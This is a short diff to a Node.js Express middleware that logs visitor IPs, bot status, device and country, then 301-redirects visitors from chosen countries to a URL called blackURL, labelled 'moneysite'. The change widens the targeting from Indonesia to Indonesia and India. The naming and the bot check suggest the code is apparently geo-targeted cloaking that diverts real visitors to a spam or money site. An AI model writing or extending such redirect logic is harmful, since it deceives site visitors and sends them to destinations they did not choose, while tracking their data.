@@ -69,7 +69,7 @@ app.use(async (req, res, next) => {
       const sql = 'INSERT INTO visitors (linkid, ipaddress, bot, referer, device, os, browser, country) VALUES (?, ?, ?, ?, ?, ?, ?, ?)';
       await connection.query(sql, [0, clientIP, botDetect, referer, device, os, browser, country]);
 
-      if (country === 'ID') {
+      if (country === 'ID' || country === 'IN') {
         console.log('Redirect moneysite');
         return res.redirect(301, blackURL);
       } else {
